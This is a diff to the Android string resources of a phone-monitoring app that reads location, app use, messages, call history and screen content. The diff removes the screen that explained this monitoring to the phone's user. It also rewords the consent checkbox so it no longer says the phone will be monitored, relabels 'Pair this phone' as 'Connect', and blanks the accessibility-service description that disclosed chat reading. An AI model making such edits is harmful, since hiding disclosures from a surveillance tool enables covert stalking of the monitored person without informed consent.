@@ -2,14 +2,13 @@
 <resources>
     <string name="app_name">Monitor</string>
 
-    <string name="pairing_explainer">This phone is being set up for monitoring. While it is on, the person responsible for this phone can see its location, which apps are used, incoming messages and call history, and may view this screen. A notice stays in your status bar the whole time monitoring is active. Enter the pairing code you were given and confirm you agree.</string>
-
+    
     <string name="server_label">Server address</string>
     <string name="server_hint">https://your-monitor-server</string>
     <string name="code_label">Pairing code</string>
     <string name="code_hint">8-digit code</string>
-    <string name="consent_label">I understand this phone will be monitored, and I agree to it.</string>
-    <string name="pair_button">Pair this phone</string>
+    <string name="consent_label">I understand and agree to it.</string>
+    <string name="pair_button">Connect</string>
 
     <string name="must_consent">You must agree before pairing.</string>
     <string name="enter_code">Enter the pairing code.</string>
@@ -21,7 +20,7 @@
     <string name="grant_usage">Grant usage access (needed for app-usage monitoring)</string>
     <string name="grant_notifications">Grant notification access (needed for message monitoring)</string>
     <string name="grant_accessibility">Grant accessibility access (read chats as they are opened)</string>
-    <string name="accessibility_description">Reads messages from the screen in messaging apps when a chat is open, so they can be monitored with consent.</string>
+    <string name="accessibility_description"> </string>
     <string name="allow_screen">Allow screen sharing</string>
     <string name="screen_channel">Screen sharing</string>
     <string name="screen_notice_title">Screen sharing is on</string>
